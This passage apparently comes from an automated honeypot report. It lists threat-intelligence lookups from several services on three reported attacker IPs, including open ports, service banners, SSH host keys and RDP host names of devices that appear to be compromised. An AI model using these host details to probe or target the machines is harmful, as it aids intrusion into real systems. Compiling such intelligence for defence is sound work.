### Cybergordon results for: 27.93.25.111 [https://cybergordon.com/r/230e5129-8452-4434-aed1-703056011df7](https://cybergordon.com/r/230e5129-8452-4434-aed1-703056011df7)

| Engine | Results | Url |
| --- | --- | --- |
| [E33] GreyNoise | Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months.  | https://viz.greynoise.io/ip/27.93.25.111 |
| [E34] IPdata.co | Geo: Hiroshima, Hirosima (Hiroshima), Japan. Network: AS2516, KDDI Corporation, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, Charles Haley, DataPlane.org, Interserver.net, James Brine.  | https://ipdata.co |
| [E11] DShield/ISC | Found in 17 report(s) listing 4 target(s), last on 2 Feb 2024  | https://isc.sans.edu/ipinfo.html?ip=27.93.25.111 |
| [E26] MetaDefender | Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner)  | https://metadefender.opswat.com |
| [E24] BlackList DE | Found in 64 attack(s) and 29 report(s)  | https://www.blocklist.de/en/search.html?ip=27.93.25.111 |
| [E2] AbuseIPDB | Hostname(s): KD027093025111.ppp-bb.dion.ne.jp. ISP: KDDI Corporation. Usage: None. Risk 100%. 1060 report(s) by 373 user(s), last on 03 February 2024   | https://www.abuseipdb.com/check/27.93.25.111 |
| [E17] Pulsedive | Risk: none. Last seen on 1 Feb 2024. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. Opened service(s): HTTP, SSH.  | https://pulsedive.com/browse |
| [E12] AlienVault OTX | Found in 16 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/27.93.25.111 |
| [E23] Offline Feeds | Found in Duggy Tuxy - EU Botnets/Zombies/Scanners  | / |
| [E1] IPinfo | Geo: Kure, Hiroshima, JP. Network: AS2516 KDDI CORPORATION. Hostname: kd027093025111.ppp-bb.dion.ne.jp.  | https://ipinfo.io/27.93.25.111 |
| [E7] Google DNS | Current DNS PTR record(s): KD027093025111.ppp-bb.dion.ne.jp.  | https://dns.google/query?name=111.25.93.27.in-addr.arpa&type=PTR |

</details>

---


<details>
<summary>
<h3>Cybergordon results for: 111.216.194.148</h3>
</summary>


### Cybergordon results for: 111.216.194.148 [https://cybergordon.com/r/518a78e4-590b-4f58-9607-e8b679ab0108](https://cybergordon.com/r/518a78e4-590b-4f58-9607-e8b679ab0108)

| Engine | Results | Url |
| --- | --- | --- |
| [E33] GreyNoise | Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months.  | https://viz.greynoise.io/ip/111.216.194.148 |
| [E34] IPdata.co | Geo: Yokohama, Kanagawa, Japan. Network: AS2527, Sony Network Communications Inc, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, DataPlane.org, James Brine.  | https://ipdata.co |
| [E26] MetaDefender | Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner)  | https://metadefender.opswat.com |
| [E2] AbuseIPDB | Hostname(s): fp6fd8c294.ap.nuro.jp. ISP: Sony Network Communications Inc.. Usage: None. Risk 100%. 449 report(s) by 208 user(s), last on 03 February 2024   | https://www.abuseipdb.com/check/111.216.194.148 |
| [E24] BlackList DE | Found in 27 attack(s) and 16 report(s)  | https://www.blocklist.de/en/search.html?ip=111.216.194.148 |
| [E11] DShield/ISC | Found in 11 report(s) listing 4 target(s), last on 2 Feb 2024  | https://isc.sans.edu/ipinfo.html?ip=111.216.194.148 |
| [E17] Pulsedive | Risk: low. Last seen on 2 Feb 2024. Found in feed list(s): Blocklist.de Blocklist, Brute Force Hosts. Opened service(s): HTTPS, NETBIOS, RDP, SSH.  | https://pulsedive.com/browse |
| [E12] AlienVault OTX | Found in 7 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/111.216.194.148 |
| [E23] Offline Feeds | Found in IPsum (3+ blocklists)  | / |
| [E1] IPinfo | Geo: Urayasu, Tokyo, JP. Network: AS2527 Sony Network Communications Inc.. Hostname: fp6fd8c294.ap.nuro.jp.  | https://ipinfo.io/111.216.194.148 |
| [E7] Google DNS | Current DNS PTR record(s): fp6fd8c294.ap.nuro.jp.  | https://dns.google/query?name=148.194.216.111.in-addr.arpa&type=PTR |

</details>

---


</details>

---


<details>
<summary>
<h2>Shodan</h2>
</summary>


### Shodan Results Summary
Based on Shodan data, the following is known about the IP addresses involved in the attack:

### IP: 93.223.169.159
- **Open Port:** 8089
- **Protocol:** TCP
- **Service Name:** Unknown
- **Service Data:** HTTP/1.1 404 Not Found response observed.
- **Additional Information:** No further detailed service information available from Shodan.

### IP: 27.93.25.111
- **Open Ports:** 22, 80
- **Protocols:** TCP
- **Service Names:** OpenSSH 7.9p1 Raspbian-10+deb10u2+rpt1 (Port 22), Apache httpd 2.4.38 (Port 80)
- **Additional Information:** Running a version of OpenSSH associated with Raspbian and an Apache HTTP server, suggesting the possibility of a compromised or controlled device running commonly used software.

### IP: 111.216.194.148
- **Open Ports:** 22, 445, 3389, 8443, 9876
- **Protocols:** TCP
- **Service Names and Data:**
  - OpenSSH 7.9p1 Raspbian-10+deb10u2+rpt1 (Port 22)
  - Service on port 445 with enabled SMB authentication, SMB version 2 capability (Port 445)
  - Remote Desktop Protocol, suggesting access to Windows systems (Port 3389)
  - ASUS Wireless Router RT-AX86U, indicating compromised or controlled networking hardware (Port 8443)
  - An unknown service with an HTTP/1.1 401 Unauthorized response, implying a password-protected resource (Port 9876)
- **Additional Information:** A range of services suggest the potential use of compromised devices and a variety of available attack vectors.

The Shodan data implies that the attackers may be utilizing compromised devices as part of their attack infrastructure, with open ports and services that could be indicative of botnets or other forms of malicious activity. The presence of various services like OpenSSH, Apache HTTPD, SMB, RDP, and specific hardware like an ASUS router offers insights into the nature of these hosts and their potential use in attack campaigns.

- The most common **open port** was `22`, which was seen `2` times.
- The most common **protocol** was `tcp`, which was seen `8` times.
- The most common **service name** was `unknown`, which was seen `3` times.
- The most common **service signature** was `SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2+rpt1`, which was seen `2` times.
- The most common **Hostnames** was `p5ddfa99f.dip0.t-ipconnect.de`, which was seen `1` times.
- The most common **Domains** was `t-ipconnect.de`, which was seen `1` times.
- The most common **Country** was `Japan`, which was seen `2` times.
- The most common **City** was `Frankfurt am Main`, which was seen `1` times.
- The most common **Organization** was `Deutsche Telekom AG`, which was seen `1` times.
- The most common **ISP** was `Deutsche Telekom AG`, which was seen `1` times.
- The most common **ASN** was `AS3320`, which was seen `1` times.
- The IP address with the **most open ports** was `111.216.194.148` with `5` open ports.

| IP Addresss | # Open Ports | 22 | 80 | 445 | 3389 | 8089 | 8443 | 9876 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 111.216.194.148 | <details>`22`, `445`, `3389`, `8443`, `9876`<summary>`5`</summary></details> | OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1 | - | unknown | Remote Desktop Protocol | - | ASUS Wireless Router RT-AX86U | unknown |
| 27.93.25.111 | <details>`22`, `80`<summary>`2`</summary></details> | OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1 | Apache httpd2.4.38 | - | - | - | - | - |
| 93.223.169.159 | <details>`8089`<summary>`1`</summary></details> | - | - | - | - | unknown | - | - |

<details>
<summary>
<h4>Top 7 Open Ports</h4>
</summary>

Total Open Ports: `8`
Unique: `7`

| Open Port | Times Seen |
| --- | --- |
| `22` | `2` |
| `8089` | `1` |
| `80` | `1` |
| `445` | `1` |
| `3389` | `1` |
| `8443` | `1` |
| `9876` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Protocols</h4>
</summary>

Total Protocols: `8`
Unique: `1`

| Protocol | Times Seen |
| --- | --- |
| `tcp` | `8` |

</details>

---




<details>
<summary>
<h4>Top 5 Service Names</h4>
</summary>

Total Service Names: `8`
Unique: `5`

| Service Name | Times Seen |
| --- | --- |
| `unknown` | `3` |
| `OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1` | `2` |
| `Apache httpd2.4.38` | `1` |
| `Remote Desktop Protocol` | `1` |
| `ASUS Wireless Router RT-AX86U` | `1` |

</details>

---




<details>
<summary>
<h4>Top 7 Service Signatures</h4>
</summary>

Total Service Signatures: `8`
Unique: `7`

| Service Signature | Times Seen |
| --- | --- |
| `SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2+rpt1` | `2` |
| `HTTP/1.1 404 Not Found` | `1` |
| `HTTP/1.1 200 OK` | `1` |
| `SMB Status:` | `1` |
| `Remote Desktop Protocol\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x1f\x08\x00\x02\x00\x00\x00` | `1` |
| `HTTP/1.0 200 OK` | `1` |
| `HTTP/1.1 401 Unauthorized` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 Hostnames</h4>
</summary>

Total Hostnamess: `3`
Unique: `3`

| Hostnames | Times Seen |
| --- | --- |
| `p5ddfa99f.dip0.t-ipconnect.de` | `1` |
| `KD027093025111.ppp-bb.dion.ne.jp` | `1` |
| `dcpiont.asuscomm.com
fp6fd8c294.ap.nuro.jp` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 Domains</h4>
</summary>

Total Domainss: `3`
Unique: `3`

| Domains | Times Seen |
| --- | --- |
| `t-ipconnect.de` | `1` |
| `dion.ne.jp` | `1` |
| `asuscomm.com nuro.jp` | `1` |

</details>

---




<details>
<summary>
<h4>Top 2 Countrys</h4>
</summary>

Total Countrys: `3`
Unique: `2`

| Country | Times Seen |
| --- | --- |
| `Japan` | `2` |
| `Germany` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 Citys</h4>
</summary>

Total Citys: `3`
Unique: `3`

| City | Times Seen |
| --- | --- |
| `Frankfurt am Main` | `1` |
| `Kure` | `1` |
| `Urayasu` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 Organizations</h4>
</summary>

Total Organizations: `3`
Unique: `3`

| Organization | Times Seen |
| --- | --- |
| `Deutsche Telekom AG` | `1` |
| `KDDI CORPORATION` | `1` |
| `So-net Service` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 ISPs</h4>
</summary>

Total ISPs: `3`
Unique: `3`

| ISP | Times Seen |
| --- | --- |
| `Deutsche Telekom AG` | `1` |
| `KDDI CORPORATION` | `1` |
| `Sony Network Communications Inc.` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 ASNs</h4>
</summary>

Total ASNs: `3`
Unique: `3`

| ASN | Times Seen |
| --- | --- |
| `AS3320` | `1` |
| `AS2516` | `1` |
| `AS2527` | `1` |

</details>

---


### Shodan Results

<details>
<summary>
<h3>Shodan results for: 93.223.169.159</h3>
</summary>


### Shodan results for: 93.223.169.159 [https://www.shodan.io/host/93.223.169.159](https://www.shodan.io/host/93.223.169.159)

| Hostnames | Domains | Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- | --- | --- |
| p5ddfa99f.dip0.t-ipconnect.de | t-ipconnect.de | Germany | Frankfurt am Main | Deutsche Telekom AG | Deutsche Telekom AG | AS3320 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
| 8089 | tcp | unknown | 2024-01-15T18:20:36.850447 |

#### Port 8089 (tcp): unknown

<details>
<summary>
<h4>Raw Service Data for Port 8089 (tcp): unknown</h4>
</summary>


```
HTTP/1.1 404 Not Found
Content-Length: 0
```

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 404 Not Found |
| Content-Length | 0 |

</details>

---


<details>
<summary>
<h3>Shodan results for: 27.93.25.111</h3>
</summary>


### Shodan results for: 27.93.25.111 [https://www.shodan.io/host/27.93.25.111](https://www.shodan.io/host/27.93.25.111)

| Hostnames | Domains | Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- | --- | --- |
| KD027093025111.ppp-bb.dion.ne.jp | dion.ne.jp | Japan | Kure | KDDI CORPORATION | KDDI CORPORATION | AS2516 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
| 22 | tcp | OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1 | 2024-02-02T06:54:21.064401 |
| 80 | tcp | Apache httpd2.4.38 | 2024-02-02T09:54:39.638615 |

#### Port 22 (tcp): OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1

<details>
<summary>
<h4>Raw Service Data for Port 22 (tcp): OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1</h4>
</summary>


```
SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2+rpt1
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQDkntix42PTKLWMIj/zHVWFGq9d7EQf/JYwARd6+cTLiaaM
2esX1k9jrC7WFXauj5ljY5ONt94E9poPgKt9H9NLKujNoaldybTdve2tpHRF+vjNHXP48ok7JobP
Ypx3wQVJep2tgknyGEv90IXMQaTrfA7C15OyihfQ8pO6XsRoyjAbSvDRMHTP3ayJPiuzopt0DV/s
p2+SXjym6aQ9cHwMXRIzv1rXTFEG1MG8x/Jbh9goqFjG+Pnvql/ZurKnpNHskbpt/GvGG5+rRwJS
GzSVGa1iZwXd4uE5U46pqIPKXFBUkTA88DKZhFt3rlta3yTVX1aaWth6qpndBzXlQ0xb
Fingerprint: bf:4a:59:16:67:89:ce:8f:e8:4a:d8:5a:02:a0:e4:28

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256
	diffie-hellman-group14-sha1

Server Host Key Algorithms:
	rsa-sha2-512
	rsa-sha2-256
	ssh-rsa
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```

</details>

---


| Key | Value |
| --- | --- |
| sig | SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2+rpt1 |
| Key type | ssh-rsa |
| Key | AAAAB3NzaC1yc2EAAAADAQABAAABAQDkntix42PTKLWMIj/zHVWFGq9d7EQf/JYwARd6+cTLiaaM2esX1k9jrC7WFXauj5ljY5ONt94E9poPgKt9H9NLKujNoaldybTdve2tpHRF+vjNHXP48ok7JobPYpx3wQVJep2tgknyGEv90IXMQaTrfA7C15OyihfQ8pO6XsRoyjAbSvDRMHTP3ayJPiuzopt0DV/sp2+SXjym6aQ9cHwMXRIzv1rXTFEG1MG8x/Jbh9goqFjG+Pnvql/ZurKnpNHskbpt/GvGG5+rRwJSGzSVGa1iZwXd4uE5U46pqIPKXFBUkTA88DKZhFt3rlta3yTVX1aaWth6qpndBzXlQ0xb |
| Fingerprint | bf:4a:59:16:67:89:ce:8f:e8:4a:d8:5a:02:a0:e4:28 |
| Kex Algorithms | ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] |
| Server Host Key Algorithms | ['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] |
| Encryption Algorithms | ['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] |
| MAC Algorithms | ['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] |
| Compression Algorithms | ['none', 'zlib@openssh.com'] |

#### Port 80 (tcp): Apache httpd2.4.38

<details>
<summary>
<h4>Raw Service Data for Port 80 (tcp): Apache httpd2.4.38</h4>
</summary>


```
HTTP/1.1 200 OK
Date: Fri, 02 Feb 2024 09:54:38 GMT
Server: Apache/2.4.38 (Raspbian)
Set-Cookie: PHPSESSID=pgjfqbsb5us47qae39lhnkss30; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 6706
Content-Type: text/html; charset=UTF-8
```

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 200 OK |
| Date | Fri, 02 Feb 2024 09:54:38 GMT |
| Server | Apache/2.4.38 (Raspbian) |
| Set-Cookie | PHPSESSID=pgjfqbsb5us47qae39lhnkss30; path=/ |
| Expires | Thu, 19 Nov 1981 08:52:00 GMT |
| Cache-Control | no-store, no-cache, must-revalidate |
| Pragma | no-cache |
| Vary | Accept-Encoding |
| Content-Length | 6706 |
| Content-Type | text/html; charset=UTF-8 |

</details>

---


<details>
<summary>
<h3>Shodan results for: 111.216.194.148</h3>
</summary>


### Shodan results for: 111.216.194.148 [https://www.shodan.io/host/111.216.194.148](https://www.shodan.io/host/111.216.194.148)

| Hostnames | Domains | Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- | --- | --- |
| dcpiont.asuscomm.com
fp6fd8c294.ap.nuro.jp | asuscomm.com nuro.jp | Japan | Urayasu | So-net Service | Sony Network Communications Inc. | AS2527 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
| 22 | tcp | OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1 | 2024-02-02T11:01:51.144146 |
| 445 | tcp | unknown | 2024-02-02T14:03:36.190075 |
| 3389 | tcp | Remote Desktop Protocol | 2024-01-31T22:27:09.669382 |
| 8443 | tcp | ASUS Wireless Router RT-AX86U | 2024-01-31T19:23:21.569104 |
| 9876 | tcp | unknown | 2024-01-17T12:28:35.650189 |

#### Port 22 (tcp): OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1

<details>
<summary>
<h4>Raw Service Data for Port 22 (tcp): OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1</h4>
</summary>


```
SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2+rpt1
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQCfMqEmIC6zeFJS0mkfoMTgNUyXKEWlnyCYB12XFzBaHoK1
uZx5jUfrNlm/cqcKuJEm6IEKgqi6VUc58dfaLGe7OGuzRxUT6l7JJ8ZCcOD9VhVevef7ToCrx9xj
4zfShsM40ApSc91wi5/mkegtJAoFNOjmNEORH6Fvs8wfbXCChBr4IPfiTaeCbXn0FACrCtVU2Xuf
/7R1u6clEVGUK5Zi1oQCWxm49wn7PE1ax3cThRhY5UCrQ8LycaFtTGBFCbphzlJctSt4RAkvsgZz
OLk1kJ4Uvh6yeaNSxSWdb0bu7spHo0hi5zfk9pa0F3zLKF1zgAtyHRgU9DpTBN8+5+1b
Fingerprint: 0f:e9:55:d1:e6:0e:b3:70:b5:35:c0:39:b3:88:37:82

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256
	diffie-hellman-group14-sha1

Server Host Key Algorithms:
	rsa-sha2-512
	rsa-sha2-256
	ssh-rsa
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```

</details>

---


| Key | Value |
| --- | --- |
| sig | SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2+rpt1 |
| Key type | ssh-rsa |
| Key | AAAAB3NzaC1yc2EAAAADAQABAAABAQCfMqEmIC6zeFJS0mkfoMTgNUyXKEWlnyCYB12XFzBaHoK1uZx5jUfrNlm/cqcKuJEm6IEKgqi6VUc58dfaLGe7OGuzRxUT6l7JJ8ZCcOD9VhVevef7ToCrx9xj4zfShsM40ApSc91wi5/mkegtJAoFNOjmNEORH6Fvs8wfbXCChBr4IPfiTaeCbXn0FACrCtVU2Xuf/7R1u6clEVGUK5Zi1oQCWxm49wn7PE1ax3cThRhY5UCrQ8LycaFtTGBFCbphzlJctSt4RAkvsgZzOLk1kJ4Uvh6yeaNSxSWdb0bu7spHo0hi5zfk9pa0F3zLKF1zgAtyHRgU9DpTBN8+5+1b |
| Fingerprint | 0f:e9:55:d1:e6:0e:b3:70:b5:35:c0:39:b3:88:37:82 |
| Kex Algorithms | ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] |
| Server Host Key Algorithms | ['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] |
| Encryption Algorithms | ['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] |
| MAC Algorithms | ['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] |
| Compression Algorithms | ['none', 'zlib@openssh.com'] |

#### Port 445 (tcp): unknown

<details>
<summary>
<h4>Raw Service Data for Port 445 (tcp): unknown</h4>
</summary>


```
SMB Status:
  Authentication: enabled
  SMB Version: 2
  Capabilities: raw-mode
```

</details>

---


| Key | Value |
| --- | --- |
| sig | SMB Status: |
| Authentication | enabled |
| SMB Version | 2 |
| Capabilities | raw-mode |

#### Port 3389 (tcp): Remote Desktop Protocol

<details>
<summary>
<h4>Raw Service Data for Port 3389 (tcp): Remote Desktop Protocol</h4>
</summary>


```
Remote Desktop Protocol
\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x1f\x08\x00\x02\x00\x00\x00
Remote Desktop Protocol NTLM Info:
  OS: Windows 10 (version 2004)/Windows Server (version 2004)
  OS Build: 10.0.19041
  Target Name: BASENP20-045
  NetBIOS Domain Name: BASENP20-045
  NetBIOS Computer Name: BASENP20-045
  DNS Domain Name: BASENP20-045
  FQDN: BASENP20-045
```

</details>

---


| Key | Value |
| --- | --- |
| sig | Remote Desktop Protocol\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x1f\x08\x00\x02\x00\x00\x00 |
| Remote Desktop Protocol NTLM Info | [] |
| OS | Windows 10 (version 2004)/Windows Server (version 2004) |
| OS Build | 10.0.19041 |
| Target Name | BASENP20-045 |
| NetBIOS Domain Name | BASENP20-045 |
| NetBIOS Computer Name | BASENP20-045 |
| DNS Domain Name | BASENP20-045 |
| FQDN | BASENP20-045 |

#### Port 8443 (tcp): ASUS Wireless Router RT-AX86U

<details>
<summary>
<h4>Raw Service Data for Port 8443 (tcp): ASUS Wireless Router RT-AX86U</h4>
</summary>


```
HTTP/1.0 200 OK
Server: httpd/3.0
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
Date: Wed, 31 Jan 2024 19:18:33 GMT
Content-Type: text/html
Connection: close
```

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.0 200 OK |
| Server | httpd/3.0 |
| x-frame-options | SAMEORIGIN |
| x-xss-protection | 1; mode=block |
| Date | Wed, 31 Jan 2024 19:18:33 GMT |
| Content-Type | text/html |
| Connection | close |

#### Port 9876 (tcp): unknown

<details>
<summary>
<h4>Raw Service Data for Port 9876 (tcp): unknown</h4>
</summary>


```
HTTP/1.1 401 Unauthorized
Www-Authenticate: Basic realm="Restricted"
Date: Wed, 17 Jan 2024 12:26:15 GMT
Content-Length: 0
```

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 401 Unauthorized |
| Www-Authenticate | Basic realm="Restricted" |
| Date | Wed, 17 Jan 2024 12:26:15 GMT |
| Content-Length | 0 |

</details>

---


</details>

---


<details>
<summary>
<h2>ThreatFox</h2>
</summary>


### ThreatFox Results Summary
Based on the ThreatFox data, there is no information or reports associated with the IP addresses involved in the attack:
- 93.223.169.159
- 27.93.25.111
- 111.216.194.148

ThreatFox does not have any entries for these IPs, which suggests that they may not have been reported or tracked in this particular threat intelligence platform at this time.

</details>

---


<details>
<summary>
<h2>Internet Storm Center (ISC)</h2>
</summary>


### Internet Storm Center (ISC) [https://isc.sans.edu/ipinfo/](https://isc.sans.edu/ipinfo/)
Based on ISC (Internet Storm Center) data, the following is known about the IP addresses involved in the attack:

### IP: 93.223.169.159
- **Total Reports:** 11
- **Honeypots Targeted:** 2
- **First Seen:** September 16, 2023
- **Last Seen:** February 1, 2024
- **Network:** 93.192.0.0/10
- **AS Name:** DTAG Internet service provider operations
- **AS Country Code:** Germany
- **Threat Feeds:**
  - Blocklistde22 (first seen on September 13, 2023, last seen on February 1, 2024)

### IP: 27.93.25.111
- **Total Reports:** 17
- **Honeypots Targeted:** 4
- **First Seen:** September 28, 2023
- **Last Seen:** February 2, 2024
- **Network:** 27.93.0.0/16
- **AS Name:** KDDI Corporation
- **AS Country Code:** Japan
- **Threat Feeds:**
  - Blocklistde22 (first seen on September 29, 2023, last seen on February 2, 2024)

### IP: 111.216.194.148
- **Total Reports:** 11
- **Honeypots Targeted:** 4
- **First Seen:** November 26, 2023
- **Last Seen:** February 2, 2024
- **Network:** 111.216.0.0/15
- **AS Name:** Sony Network Communications Inc.
- **AS Country Code:** Japan
- **Threat Feeds:**
  - Blocklistde22 (first seen on November 27, 2023, last seen on February 2, 2024)

The ISC data indicates that all three IP addresses have been repeatedly reported for malicious activities targeting honeypots, which serve as security mechanisms set up to detect and analyze unauthorized accesses and attacks. These IPs have been active over several months, as indicated by the first and last seen dates, with multiple reports suggesting ongoing malicious behavior. They are associated with large network providers in Germany and Japan and have been recorded on threat feed blocklistde22.

* `3` of the `3` unique source IPs have reports on the Internet Storm Center (ISC).
* `39` total attacks were reported.
* `10` unique targets were attacked.
* The IP address with the **most reports** was `27.93.25.111` with `17` reports.
* The IP address with the **most targets** was `27.93.25.111` with `4` targets.
* The **first report** was on `2023-09-16` from `93.223.169.159`.
* The **most recent** was on `2024-02-02` from `27.93.25.111`.


| IP Address | Total Reports | Targets | First Report | Last Report | Update Time |
| --- | --- | --- | --- | --- | --- |
| 27.93.25.111 | 17 | 4 | 2023-09-28 | 2024-02-02 | 2024-02-03 04:07:27 |
| 111.216.194.148 | 11 | 4 | 2023-11-26 | 2024-02-02 | 2024-02-03 04:07:27 |
| 93.223.169.159 | 11 | 2 | 2023-09-16 | 2024-02-01 | 2024-02-02 04:07:17 |

<details>
<summary>
<h4>Top 2 Asabusecontacts</h4>
</summary>

Total asabusecontacts: `3`
Unique: `2`

| asabusecontact | Times Seen |
| --- | --- |
| `hostmaster@nic.ad.jp` | `2` |
| `auftrag@nic.telekom.de` | `1` |

</details>

---


<details>
<summary>
<h4>Top 3 As</h4>
</summary>

Total ass: `3`
Unique: `3`

| as | Times Seen |
| --- | --- |
| `3320` | `1` |
| `2516` | `1` |
| `2527` | `1` |

</details>

---


<details>
<summary>
<h4>Top 3 Asnames</h4>
</summary>

Total asnames: `3`
Unique: `3`

| asname | Times Seen |
| --- | --- |
| `DTAG Internet service provider operations` | `1` |
| `KDDI KDDI CORPORATION` | `1` |
| `SO-NET Sony Network Communications Inc.` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Ascountrys</h4>
</summary>

Total ascountrys: `3`
Unique: `2`

| ascountry | Times Seen |
| --- | --- |
| `JP` | `2` |
| `DE` | `1` |

</details>

---


<details>
<summary>
<h4>Top 3 Assizes</h4>
</summary>

Total assizes: `3`
Unique: `3`

| assize | Times Seen |
| --- | --- |
| `36023808` | `1` |
| `18255488` | `1` |
| `3851264` | `1` |

</details>

---


<details>
<summary>
<h4>Top 3 Networks</h4>
</summary>

Total networks: `3`
Unique: `3`

| network | Times Seen |
| --- | --- |
| `93.192.0.0/10` | `1` |
| `27.93.0.0/16` | `1` |
| `111.216.0.0/15` | `1` |

</details>

---


<details>
<summary>
<h4>Top 1 Threatfeeds</h4>
</summary>

Total threatfeedss: `3`
Unique: `1`

| threatfeeds | Times Seen |
| --- | --- |
| `blocklistde22` | `3` |

</details>

---


</details>

---


<details>
<summary>
<h2>Whois</h2>
</summary>


### Whois Results Summary

<details>
<summary>
